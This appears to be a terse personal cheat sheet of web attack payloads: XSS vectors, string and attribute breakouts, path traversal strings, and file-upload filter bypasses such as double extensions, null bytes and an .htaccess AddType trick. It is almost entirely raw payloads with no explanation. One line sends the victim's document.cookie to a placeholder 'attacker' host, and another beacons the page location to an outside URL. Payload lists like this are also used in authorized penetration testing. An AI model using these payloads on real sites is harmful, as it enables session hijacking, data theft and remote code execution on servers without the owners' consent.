# XSS easy payload

%3Cimg%20src%3D0%20onerror%3D%27alert(00)%27%2F%3E
<img src=0 onerror='alert(00)'/>
<IMG SRC= onmouseover="alert('xxs')">

text with print: <img src=1 onerror=print()>

<img src=0 onerror='alert`1`'/>

<img src=0 onerror='alert(String.fromCharCode(88,83,83))'/>

document.write("<img src=http://attacker/cookie_theif?c="+document.cookie+" />")
console.log('XSS')
(new Image()).src = "https://localhost/log_xss?from=" + window.location;
document.body.innerHTML = 'XSS';


# breaking strings

template literal: ${alert(document.domain)}
breaking string: \';alert(document.domain)//
tag attribute: " autofocus onfocus=alert(document.domain) x="
JS closing previous tag: "><img src=0 onerror=alert(1)>'
check ===location.search===
Add additional parameter (check JS code) = "</select><img%20src=0%20onerror=alert(123)>


# trasversal and fileupload

trasversal: /../../../../
trasversal: filename=../datei.php / ..%2fdatei.php
content-type= type/type

Read: AddType application/x-httpd-php .l33t / .htaccess

Null terminator= %00

Double extension: datei.php.jpg
Trailing: exploit.php.
URL encoding: exploit%2Ephp
semicolon: exploit.asp;.jpg or exploit.asp%00.jp
recursiv: exploit.p.phphp
